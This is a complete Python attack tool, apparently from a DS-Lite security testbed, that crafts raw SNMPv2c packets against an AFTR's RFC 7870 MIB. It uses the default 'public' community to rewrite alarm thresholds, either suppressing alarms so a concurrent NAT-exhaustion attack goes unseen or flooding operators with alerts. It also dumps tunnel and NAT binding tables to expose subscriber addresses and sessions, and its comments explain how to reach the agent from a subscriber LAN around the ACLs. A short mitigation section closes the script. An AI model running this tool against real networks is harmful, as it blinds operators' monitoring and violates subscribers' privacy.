#!/usr/bin/python
# T14 – SNMP Threshold Manipulation (Alarm Suppression / Alarm Flooding)
# T15 – MIB Information Disclosure
#
# RFC 7870 defines the DSLITE-MIB (IANA mib-2.240 = 1.3.6.1.2.1.240)
# with three subtrees: dsliteTunnel, dsliteNAT, dsliteInfo.
#
# The dsliteInfo subtree contains three WRITABLE alarm threshold scalars
# under dsliteAFTRAlarmScalar (.1.3.1):
#
#   dsliteAFTRAlarmConnectNumber (.1)  – tunnel count alarm threshold (default 60)
#   dsliteAFTRAlarmSessionNumber (.2)  – per-user session alarm threshold (default -1 = disabled)
#   dsliteAFTRAlarmPortNumber    (.3)  – NAT port usage alarm threshold (default -1 = disabled)
#
# These thresholds control three SNMP notifications (traps):
#   dsliteTunnelNumAlarm           – fires when tunnels > ConnectNumber
#   dsliteAFTRUserSessionNumAlarm  – fires when sessions > SessionNumber
#   dsliteAFTRPortUsageOfSpecificIpAlarm – fires when ports > PortNumber
#
# Attackers with SNMP write access (or default community strings) can:
#
#   T14 – MANIPULATION:
#     a) Suppress alarms: set ConnectNumber to max → AFTR never triggers alerts
#        during concurrent attacks (T1 NAT exhaustion goes unnoticed by NOC)
#     b) Generate alarm floods: set thresholds to 0 → constant alerts
#        cause operator desensitization, masking real attacks
#
#   T15 – DISCLOSURE:
#     a) Walk dsliteTunnelTable → reveals B4 IPv6 addresses, tunnel names,
#        subscriber topology, prefix lengths, encapsulation type
#     b) Walk dsliteNATBindTable → reveals active subscriber sessions,
#        real-time NAT bindings, mapping/filtering behavior (privacy violation)
#     c) Walk dsliteStatisticsTable → reveals tunnel traffic counters
#     d) Read alarm identity objects → reveals which B4/IP triggered alarms
#
# RFC 7870 Section 7 security warning:
#   "Unauthorized monitoring of these objects will violate individual
#    subscribers' privacy."
#   "Implementations SHOULD provide SNMPv3 ... with AES cipher algorithm."
#   "Deployment of SNMP versions prior to SNMPv3 is NOT RECOMMENDED."
#
# Target: AFTR SNMP agent (snmp_agent.py) on UDP/161 at the OAM IP 10.99.0.1.
#
# Attacker position: P3 (operator OAM network) is the textbook case, BUT this tool
# also runs from P1 — ANY subscriber LAN host behind a B4 (a malicious customer, no
# compromise required). A subscriber's route to 10.99.0.1 goes through the DS-Lite
# softwire, so its SNMP is encapsulated (outer IPv6 proto-4) and bypasses the
# eth-isp/eth-wan udp/161 ACLs; the AFTR decapsulates it and the inner udp/161
# reaches the agent. Verified: pcaps/per_attack/T15/T15_3 (LAN) + T15_4 (tunnel).
#
# Usage:
#   # T15 – read MIB tables:
#   python3 snmp_attack.py read --target 127.0.0.1 --oids tunnel,nat,thresholds
#
#   # T14 – suppress alarms:
#   python3 snmp_attack.py set --target 127.0.0.1 \
#       --oid alarmConnectNumber --value 4294967295
#
#   # T14 – generate alarm flood:
#   python3 snmp_attack.py set --target 127.0.0.1 \
#       --oid alarmConnectNumber --value 0
import argparse
import random
import socket
import struct
import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from validate_parameters import is_valid_ipv4

# ── RFC 7870 DSLITE-MIB OID definitions (IANA mib-2.240) ────────────────

OID_BASE = (1, 3, 6, 1, 2, 1, 240)

KNOWN_OIDS = {
    # System MIB
    'sysDescr':           (1, 3, 6, 1, 2, 1, 1, 1, 0),
    'sysUpTime':          (1, 3, 6, 1, 2, 1, 1, 3, 0),

    # dsliteTunnel subtree (.1.1)
    'tunnelCount':        OID_BASE + (1, 1, 2, 0),

    # dsliteNAT subtree (.1.2)
    'natBindCount':       OID_BASE + (1, 2, 2, 0),

    # dsliteInfo.dsliteAFTRAlarmScalar (.1.3.1) — EXACT RFC 7870 §8 order.
    # Notify-identity objects first (.1-.5), then the WRITABLE thresholds (.6-.8):
    'alarmB4AddrType':    OID_BASE + (1, 3, 1, 1),  # B4 address type in alarm
    'alarmB4Addr':        OID_BASE + (1, 3, 1, 2),  # B4 address that triggered alarm
    'alarmProtocolType':  OID_BASE + (1, 3, 1, 3),  # protocol type in alarm
    'alarmSpecificIPType':OID_BASE + (1, 3, 1, 4),  # specific-IP address type
    'alarmSpecificIP':    OID_BASE + (1, 3, 1, 5),  # specific IP in port alarm
    'alarmConnectNumber': OID_BASE + (1, 3, 1, 6),  # tunnel alarm threshold (Integer32 60..90, default 60, WRITABLE)
    'alarmSessionNumber': OID_BASE + (1, 3, 1, 7),  # per-user session threshold (default -1, WRITABLE)
    'alarmPortNumber':    OID_BASE + (1, 3, 1, 8),  # NAT port-usage threshold (default -1, WRITABLE)

    # dsliteStatisticsTable (.1.3.2) — Counter64 per-subscriber stats
    'statsDiscards':      OID_BASE + (1, 3, 2, 1),
    'statsSends':         OID_BASE + (1, 3, 2, 2),
    'statsReceives':      OID_BASE + (1, 3, 2, 3),
    'statsIPv4Sessions':  OID_BASE + (1, 3, 2, 4),
    'statsIPv6Sessions':  OID_BASE + (1, 3, 2, 5),
}

# dsliteTunnelTable entries (.1.1.1.col.row)
# Columns: 1=addressType, 2=startAddress(B4 IPv6), 3=endAddress(AFTR IPv6),
#          4=startAddPreLen, 5=tunnelName, 6=encapsMethod(dsLite=17)
for i in range(1, 11):
    KNOWN_OIDS[f'tunnelAddrType.{i}']    = OID_BASE + (1, 1, 1, 1, i)
    KNOWN_OIDS[f'tunnelStartAddr.{i}']   = OID_BASE + (1, 1, 1, 2, i)
    KNOWN_OIDS[f'tunnelEndAddr.{i}']     = OID_BASE + (1, 1, 1, 3, i)
    KNOWN_OIDS[f'tunnelStartPreLen.{i}'] = OID_BASE + (1, 1, 1, 4, i)
    KNOWN_OIDS[f'tunnelName.{i}']        = OID_BASE + (1, 1, 1, 5, i)
    KNOWN_OIDS[f'tunnelEncaps.{i}']      = OID_BASE + (1, 1, 1, 6, i)

# dsliteNATBindTable entries (.1.2.1.col.row)
# Columns: 1=protocol, 2=externalAddr, 3=externalPort,
#          4=internalAddr, 5=internalPort, 6=dstAddr, 7=dstPort,
#          8=mapBehavior, 9=filterBehavior, 10=addressPooling, 11=raw
for i in range(1, 21):
    KNOWN_OIDS[f'natProtocol.{i}']       = OID_BASE + (1, 2, 1, 1, i)
    KNOWN_OIDS[f'natExtAddr.{i}']        = OID_BASE + (1, 2, 1, 2, i)
    KNOWN_OIDS[f'natExtPort.{i}']        = OID_BASE + (1, 2, 1, 3, i)
    KNOWN_OIDS[f'natIntAddr.{i}']        = OID_BASE + (1, 2, 1, 4, i)
    KNOWN_OIDS[f'natIntPort.{i}']        = OID_BASE + (1, 2, 1, 5, i)
    KNOWN_OIDS[f'natDstAddr.{i}']        = OID_BASE + (1, 2, 1, 6, i)
    KNOWN_OIDS[f'natDstPort.{i}']        = OID_BASE + (1, 2, 1, 7, i)
    KNOWN_OIDS[f'natMapBehavior.{i}']    = OID_BASE + (1, 2, 1, 8, i)
    KNOWN_OIDS[f'natFilterBehavior.{i}'] = OID_BASE + (1, 2, 1, 9, i)
    KNOWN_OIDS[f'natPooling.{i}']        = OID_BASE + (1, 2, 1, 10, i)
    KNOWN_OIDS[f'natRaw.{i}']            = OID_BASE + (1, 2, 1, 11, i)

OID_GROUPS = {
    'tunnel': ['tunnelCount'] + [k for k in KNOWN_OIDS
               if k.startswith('tunnel') and k != 'tunnelCount'],
    'nat':    ['natBindCount'] + [k for k in KNOWN_OIDS
               if k.startswith('nat') and k != 'natBindCount'],
    'thresholds': ['alarmConnectNumber', 'alarmSessionNumber', 'alarmPortNumber'],
    'alarms': ['alarmConnectNumber', 'alarmSessionNumber', 'alarmPortNumber',
               'alarmB4Addr', 'alarmProtocolType', 'alarmSpecificIP'],
    'statistics': ['statsDiscards', 'statsSends', 'statsReceives',
                   'statsIPv4Sessions', 'statsIPv6Sessions'],
    'system': ['sysDescr', 'sysUpTime', 'tunnelCount', 'natBindCount'],
    'all':    list(KNOWN_OIDS.keys()),
}

# Backward-compatible aliases for old OID names
OID_ALIASES = {
    'highThreshold': 'alarmConnectNumber',
    'lowThreshold': 'alarmSessionNumber',
    'sessThreshold': 'alarmPortNumber',
}


# ── BER encoding helpers ──────────────────────────────────────────────────

def ber_len(n):
    if n < 128:
        return bytes([n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])


def tlv(tag, value):
    if isinstance(value, int):
        raw = []
        tmp = value
        while tmp:
            raw.append(tmp & 0xFF)
            tmp >>= 8
        raw.reverse()
        if not raw or (raw[0] & 0x80):
            raw.insert(0, 0)
        value = bytes(raw) if raw else b'\x00'
    return bytes([tag]) + ber_len(len(value)) + value


def encode_oid(oid_tuple):
    result = bytes([oid_tuple[0] * 40 + oid_tuple[1]])
    for val in oid_tuple[2:]:
        if val < 128:
            result += bytes([val])
        else:
            parts = []
            parts.append(val & 0x7F)
            val >>= 7
            while val:
                parts.append((val & 0x7F) | 0x80)
                val >>= 7
            parts.reverse()
            result += bytes(parts)
    return tlv(0x06, result)


def build_get_request(community, oid_tuple, txid=None):
    """Build SNMPv2c GetRequest PDU.

    RFC 3416 §4.1 — request-id (txid) must be unique-per-request so the
    response can be correlated; fixed/sequential values trip IDS rules.
    """
    if txid is None:
        txid = random.randint(1, 0x7FFFFFFF)
    oid_tlv = encode_oid(oid_tuple)
    null_tlv = tlv(0x05, b'')
    varbind = tlv(0x30, oid_tlv + null_tlv)
    varbind_list = tlv(0x30, varbind)
    pdu_body = tlv(0x02, txid) + tlv(0x02, 0) + tlv(0x02, 0) + varbind_list
    pdu = tlv(0xA0, pdu_body)
    version = tlv(0x02, 1)  # SNMPv2c = 1
    comm = tlv(0x04, community.encode())
    return tlv(0x30, version + comm + pdu)


def build_set_request(community, oid_tuple, int_value, txid=None):
    """Build SNMPv2c SetRequest PDU with Integer32 value (RFC 7870 SYNTAX).

    Integer32 is a signed 32-bit type (range -2^31..2^31-1).  Two's-complement
    BER encoding is used so the value-length matches the dissector's
    expectation; values outside that range are clamped to ±(2^31-1) so the
    on-wire encoding never exceeds 4 bytes (avoiding "wrong length for
    VarBind/value" rejects from strict agents).

    RFC 3416 §4.1 — request-id must be unique-per-request.
    """
    if txid is None:
        txid = random.randint(1, 0x7FFFFFFF)
    oid_tlv = encode_oid(oid_tuple)
    # Clamp to Integer32 range per RFC 7870
    if int_value > 0x7FFFFFFF:
        int_value = 0x7FFFFFFF
    elif int_value < -0x80000000:
        int_value = -0x80000000
    # Two's-complement BER encoding (smallest signed octet string)
    if int_value >= 0:
        raw = []
        tmp = int_value
        if tmp == 0:
            raw = [0]
        else:
            while tmp:
                raw.append(tmp & 0xFF)
                tmp >>= 8
            raw.reverse()
            if raw[0] & 0x80:
                raw.insert(0, 0)
    else:
        # Two's-complement form for negative ints
        n_bytes = (int_value.bit_length() + 8) // 8 or 1
        twos = int_value & ((1 << (n_bytes * 8)) - 1)
        raw = list(twos.to_bytes(n_bytes, 'big'))
        if not (raw[0] & 0x80):
            raw.insert(0, 0xFF)
    val_tlv = tlv(0x02, bytes(raw))
    varbind = tlv(0x30, oid_tlv + val_tlv)
    varbind_list = tlv(0x30, varbind)
    pdu_body = tlv(0x02, txid) + tlv(0x02, 0) + tlv(0x02, 0) + varbind_list
    pdu = tlv(0xA3, pdu_body)  # 0xA3 = SetRequest
    version = tlv(0x02, 1)
    comm = tlv(0x04, community.encode())
    return tlv(0x30, version + comm + pdu)


def parse_response(data):
    """Extract (rcode, oid_str, value_str) from SNMP response."""
    # BER length decoder: short form (<128) AND long form (high bit set => next
    # 7 bits = count of length octets). Used everywhere so responses whose
    # payload exceeds 127 bytes (e.g. the natRaw conntrack strings) parse instead
    # of giving "index out of range".
    def _berlen(buf, pos):
        b = buf[pos]; pos += 1
        if b & 0x80:
            nlen = b & 0x7F
            length = int.from_bytes(buf[pos:pos+nlen], 'big')
            pos += nlen
        else:
            length = b
        return length, pos

    try:
        if data[0] != 0x30:
            return None, None, 'malformed'
        _outer_len, _inner_start = _berlen(data, 1)
        inner = data[_inner_start:]

        offset = 0
        # Skip version
        offset += 1
        ll, offset = _berlen(inner, offset)
        offset += ll
        # Skip community
        offset += 1
        ll, offset = _berlen(inner, offset)
        offset += ll
        # PDU
        pdu_tag = inner[offset]; offset += 1
        pdu_ll, offset = _berlen(inner, offset)
        pdu = inner[offset:offset+pdu_ll]

        # RequestID
        p_off = 1
        req_len, p_off = _berlen(pdu, p_off)
        p_off += req_len
        # ErrorStatus
        p_off += 1
        err_len, p_off = _berlen(pdu, p_off)
        err_status = int.from_bytes(pdu[p_off:p_off+err_len], 'big')
        p_off += err_len
        # ErrorIndex
        p_off += 1
        eridx_len, p_off = _berlen(pdu, p_off)
        p_off += eridx_len
        # VarBindList
        vbl_tag = pdu[p_off]; p_off += 1
        vbl_len, p_off = _berlen(pdu, p_off)
        vbl = pdu[p_off:p_off+vbl_len]
        # First varbind
        vb_tag = vbl[0]
        vb_len, vb_hdr = _berlen(vbl, 1)
        vb = vbl[vb_hdr:vb_hdr+vb_len]
        # OID
        oid_tag = vb[0]
        oid_len, oid_hdr = _berlen(vb, 1)
        oid_bytes = vb[oid_hdr:oid_hdr+oid_len]
        val_offset = oid_hdr + oid_len
        val_tag = vb[val_offset]
        val_len, val_hdr = _berlen(vb, val_offset + 1)
        val_bytes = vb[val_hdr:val_hdr+val_len]

        # Decode OID
        oid_parts = [oid_bytes[0] // 40, oid_bytes[0] % 40]
        i2 = 1
        while i2 < len(oid_bytes):
            val2 = 0
            while i2 < len(oid_bytes):
                b = oid_bytes[i2]; i2 += 1
                val2 = (val2 << 7) | (b & 0x7F)
                if not (b & 0x80):
                    break
            oid_parts.append(val2)
        oid_str = '.'.join(map(str, oid_parts))

        # Decode value
        if val_tag == 0x02:  # Integer
            value_str = str(int.from_bytes(val_bytes, 'big'))
        elif val_tag == 0x04:  # OctetString
            try:
                value_str = val_bytes.decode()
            except Exception:
                value_str = val_bytes.hex()
        elif val_tag == 0x43:  # TimeTicks
            ticks = int.from_bytes(val_bytes, 'big')
            value_str = f"{ticks} ticks ({ticks//100}s)"
        elif val_tag == 0x41:  # Counter32 (APPLICATION-1)
            value_str = f"{int.from_bytes(val_bytes, 'big')} (Counter32)"
        elif val_tag == 0x42:  # Gauge32 (APPLICATION-2)
            value_str = f"{int.from_bytes(val_bytes, 'big')} (Gauge32)"
        elif val_tag == 0x46:  # Counter64 (APPLICATION-6, RFC 2578 / 7870)
            value_str = f"{int.from_bytes(val_bytes, 'big')} (Counter64)"
        elif val_tag == 0x05:  # Null / noSuchObject
            value_str = 'noSuchObject'
        else:
            value_str = f"[type=0x{val_tag:02x}] {val_bytes.hex()}"

        return err_status, oid_str, value_str

    except Exception as e:
        return None, None, f'parse error: {e}'


def snmp_get(host, port, community, oid_tuple, timeout=3):
    """Send SNMP GET and return (err_status, oid_str, value_str)."""
    pkt = build_get_request(community, oid_tuple)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(pkt, (host, port))
        resp, _ = s.recvfrom(65535)
        return parse_response(resp)
    except socket.timeout:
        return None, '.'.join(map(str, oid_tuple)), 'TIMEOUT'
    except Exception as e:
        return None, '.'.join(map(str, oid_tuple)), f'ERROR: {e}'
    finally:
        s.close()


def snmp_set(host, port, community, oid_tuple, int_value, timeout=3):
    """Send SNMP SET and return (err_status, oid_str, value_str)."""
    pkt = build_set_request(community, oid_tuple, int_value)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(pkt, (host, port))
        resp, _ = s.recvfrom(65535)
        return parse_response(resp)
    except socket.timeout:
        return None, '.'.join(map(str, oid_tuple)), 'TIMEOUT'
    except Exception as e:
        return None, '.'.join(map(str, oid_tuple)), f'ERROR: {e}'
    finally:
        s.close()


def parse_oid_arg(oid_str):
    """Convert OID name/alias/dotted-notation to tuple."""
    # Check backward-compatible aliases
    if oid_str in OID_ALIASES:
        oid_str = OID_ALIASES[oid_str]
    if oid_str in KNOWN_OIDS:
        return KNOWN_OIDS[oid_str]
    try:
        return tuple(int(x) for x in oid_str.split('.'))
    except Exception:
        raise ValueError(f'Invalid OID: {oid_str}')


def main():
    p = argparse.ArgumentParser(
        description="T14/T15 – SNMP Threshold Manipulation and MIB Disclosure\n"
                    "Targets the RFC 7870 DSLITE-MIB (IANA mib-2.240) on the AFTR.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
RFC 7870 DSLITE-MIB structure (IANA OID 1.3.6.1.2.1.240):

  dsliteTunnel (.1.1)         – softwire tunnel entries
    tunnelCount, tunnelAddrType, tunnelStartAddr (B4 IPv6),
    tunnelEndAddr (AFTR IPv6), tunnelStartPreLen, tunnelName, tunnelEncaps

  dsliteNAT (.1.2)            – extended NAT binding table
    natBindCount, natProtocol, natExtAddr, natExtPort,
    natIntAddr, natIntPort, natDstAddr, natDstPort,
    natMapBehavior, natFilterBehavior, natPooling, natRaw

  dsliteInfo (.1.3)           – statistics + alarm thresholds
    dsliteAFTRAlarmScalar (.1.3.1):
      alarmConnectNumber (.1) – tunnel count threshold (default 60, WRITABLE)
      alarmSessionNumber (.2) – per-user sessions (default -1, WRITABLE)
      alarmPortNumber    (.3) – NAT port usage (default -1, WRITABLE)
      alarmB4Addr        (.4) – alarm identity: B4 address
      alarmProtocolType  (.5) – alarm identity: protocol
      alarmSpecificIP    (.6) – alarm identity: specific IP
    dsliteStatisticsTable (.1.3.2):
      statsDiscards, statsSends, statsReceives, statsIPv4Sessions, statsIPv6Sessions

  dsliteNotifications (.0)
    dsliteTunnelNumAlarm (.1), dsliteAFTRUserSessionNumAlarm (.2),
    dsliteAFTRPortUsageOfSpecificIpAlarm (.3)

OID groups for --oids:
  tunnel, nat, thresholds, alarms, statistics, system, all

T14 – Alarm manipulation examples:
  # Suppress all alarms (set tunnel threshold to max → NOC blind to T1 attack):
  python3 snmp_attack.py set --target 127.0.0.1 \\
      --oid alarmConnectNumber --value 4294967295

  # Enable and lower session alarm (generate alarm floods):
  python3 snmp_attack.py set --target 127.0.0.1 \\
      --oid alarmSessionNumber --value 0

  # Enable port alarm at 0 (constant port usage alerts):
  python3 snmp_attack.py set --target 127.0.0.1 \\
      --oid alarmPortNumber --value 0

T15 – Disclosure examples:
  # Enumerate tunnel topology (subscriber B4 IPv6 addresses):
  python3 snmp_attack.py read --target 127.0.0.1 --oids tunnel

  # Reveal active NAT bindings (subscriber session privacy violation):
  python3 snmp_attack.py read --target 127.0.0.1 --oids nat

  # Read tunnel traffic statistics:
  python3 snmp_attack.py read --target 127.0.0.1 --oids statistics

  # Full MIB walk:
  python3 snmp_attack.py walk --target 127.0.0.1 --oids all
"""
    )
    p.add_argument('action', choices=['read', 'set', 'walk'],
                   help='read: GET specific OIDs; set: SET writable OID; walk: enumerate all')
    p.add_argument('--target', default='10.99.0.1',
                   help='AFTR management IPv4 address (default: 10.99.0.1, '
                        'the OAM-network address per RFC 5706 §3.1)')
    p.add_argument('--port', type=int, default=161,
                   help='SNMP UDP port (default: 161)')
    p.add_argument('--community', default='public',
                   help='SNMP community string (default: public)')
    p.add_argument('--oids', default='system',
                   help='OID group or comma-separated OID names/values (default: system)')
    p.add_argument('--oid',
                   help='Single OID name or dotted notation (for set action)')
    p.add_argument('--value', type=int,
                   help='Integer value to SET')
    args = p.parse_args()

    print(f"[*] T14/T15 – SNMP Attack on DS-Lite AFTR")
    print(f"[*] Target: {args.target}:{args.port}  Community: {args.community}")
    print(f"[*] MIB: DSLITE-MIB (RFC 7870, IANA mib-2.240)")
    print()

    if args.action == 'set':
        if not args.oid:
            p.error('--oid required for set action')
        if args.value is None:
            p.error('--value required for set action')
        oid = parse_oid_arg(args.oid)
        oid_str_display = '.'.join(map(str, oid))
        print(f"[*] T14 – Setting {args.oid} ({oid_str_display}) = {args.value}")
        err, oid_resp, val = snmp_set(args.target, args.port, args.community, oid, args.value)
        if err == 0:
            print(f"[+] SET successful: {oid_resp} = {val}")
        elif err:
            print(f"[!] SET error (status={err}): {oid_resp} = {val}")
        else:
            print(f"[!] {val}")
        print()

        # T14 impact analysis
        oid_name = args.oid
        if oid_name in OID_ALIASES:
            oid_name = OID_ALIASES[oid_name]

        # RFC 7870 alarm thresholds are Integer32 (range 0..2^31-1), so the
        # effective maximum the agent can store is 2147483647, not 2^32-1. Report
        # the value the agent ACTUALLY stored (read back), never a hardcoded claim.
        INT32_MAX = 2147483647
        if oid_name == 'alarmConnectNumber' and args.value >= INT32_MAX:
            _rb_err, _rb_oid, _rb_val = snmp_get(args.target, args.port,
                                                 args.community, oid)
            print("[!] T14 alarm SUPPRESSION active:")
            print(f"    dsliteAFTRAlarmConnectNumber now = {_rb_val} "
                  f"(Integer32 max {INT32_MAX}); the tunnel-count alarm can never trip")
            print("    → dsliteTunnelNumAlarm will NEVER fire")
            print("    → Run T1 NAT exhaustion concurrently – NOC blind to attack")
        elif oid_name == 'alarmConnectNumber' and args.value == 0:
            print("[!] T14 alarm FLOOD active:")
            print("    dsliteAFTRAlarmConnectNumber set to 0")
            print("    → dsliteTunnelNumAlarm fires constantly")
            print("    → Operator desensitization – real attacks masked by noise")
        elif oid_name == 'alarmSessionNumber' and args.value >= 0:
            print(f"[!] T14: dsliteAFTRAlarmSessionNumber set to {args.value}")
            if args.value == 0:
                print("    → dsliteAFTRUserSessionNumAlarm fires constantly (alarm flood)")
            else:
                print("    → Notification fires when sessions > this threshold")
            print("    Default was -1 (disabled). Attacker enabled/changed the alarm.")
        elif oid_name == 'alarmPortNumber' and args.value >= 0:
            print(f"[!] T14: dsliteAFTRAlarmPortNumber set to {args.value}")
            if args.value == 0:
                print("    → dsliteAFTRPortUsageOfSpecificIpAlarm fires constantly")
            else:
                print("    → Notification fires when per-IP NAT ports > this threshold")

        print(f"[!] Confirm live: snmpget -v2c -c public {args.target} {args.oid}")

    elif args.action in ('read', 'walk'):
        # Determine which OIDs to query
        oid_names = []
        for part in args.oids.split(','):
            part = part.strip()
            if part in OID_GROUPS:
                oid_names.extend(OID_GROUPS[part])
            else:
                oid_names.append(part)

        print(f"[*] T15 – MIB Information Disclosure: querying {len(oid_names)} OIDs")
        print(f"[*] RFC 7870 §7: 'Unauthorized read access violates subscriber privacy'")
        print()

        found_sensitive = []
        for name in oid_names:
            try:
                oid = parse_oid_arg(name)
            except ValueError as e:
                print(f"  [!] {e}")
                continue

            err, oid_resp, val = snmp_get(args.target, args.port, args.community, oid)
            is_sensitive = any(x in name for x in [
                'tunnel', 'nat', 'stats', 'alarm'])
            marker = (' *** SENSITIVE ***' if is_sensitive and
                      val not in ('noSuchObject', 'TIMEOUT') else '')

            if val not in ('noSuchObject', 'TIMEOUT', 'ERROR'):
                print(f"  {name:<28} {oid_resp}")
                print(f"    Value: {val}{marker}")
                if is_sensitive and val not in ('noSuchObject',):
                    found_sensitive.append((name, val))
            else:
                print(f"  {name:<28} → {val}")

        print()
        if found_sensitive:
            print(f"[!] T15 – {len(found_sensitive)} sensitive values disclosed:")
            for name, val in found_sensitive:
                if 'tunnel' in name.lower():
                    if 'StartAddr' in name:
                        print(f"  {name}: {val}  ← B4 subscriber IPv6 address")
                    elif 'Encaps' in name:
                        print(f"  {name}: {val}  ← Tunnel type (dsLite=17)")
                    else:
                        print(f"  {name}: {val}  ← Tunnel topology")
                elif 'nat' in name.lower():
                    if 'IntAddr' in name:
                        print(f"  {name}: {val}  ← Subscriber internal IPv4 (privacy)")
                    elif 'Behavior' in name or 'Pooling' in name:
                        print(f"  {name}: {val}  ← NAT behavior (port-mapping predictability)")
                    else:
                        print(f"  {name}: {val}  ← Active session (privacy violation)")
                elif 'stats' in name.lower():
                    print(f"  {name}: {val}  ← Traffic statistics")
                elif 'alarm' in name.lower():
                    print(f"  {name}: {val}  ← Alarm config (aids T14 manipulation)")
            print()
            print("RFC 7870 Section 7 warnings:")
            print("  'Various objects can reveal the identity of private hosts'")
            print("  'Unauthorized monitoring violates individual subscribers' privacy'")
            print("  'dsliteTunnelTable reveals tunnel topology that should be protected'")
            print()
            print("Attacker position: ANY subscriber on this AFTR (no compromise/OAM")
            print("  access needed). A subscriber's route to the OAM IP goes through")
            print("  the DS-Lite softwire, so its SNMP is encapsulated and bypasses")
            print("  data-plane interface ACLs; after decap it reaches the agent.")
            print("  -> raises T15 from P3 (operator OAM) to P1 (malicious customer).")
            print()
            print("Mitigation:")
            print("  - Implementations MUST include full SNMPv3 USM with AES")
            print("  - Deployment of SNMPv2c is NOT RECOMMENDED (RFC 7870 §7)")
            print("  - Restrict SNMP to the management VLAN — BUT interface/VLAN ACLs")
            print("    alone are INSUFFICIENT: tunnelled subscriber traffic decapsulates")
            print("    onto the OAM subnet. ALSO drop subscriber-range -> OAM-subnet on")
            print("    the AFTR (e.g. nft: ip saddr 10.0.0.0/16 ip daddr 10.99.0.0/24 drop).")

        print(f"[!] Confirm live: snmpwalk -v2c -c public {args.target} 1.3.6.1.2.1.240")
        print(f"[!] From a SUBSCRIBER LAN host too (P1), not just the OAM network (P3).")


if __name__ == '__main__':
    main()
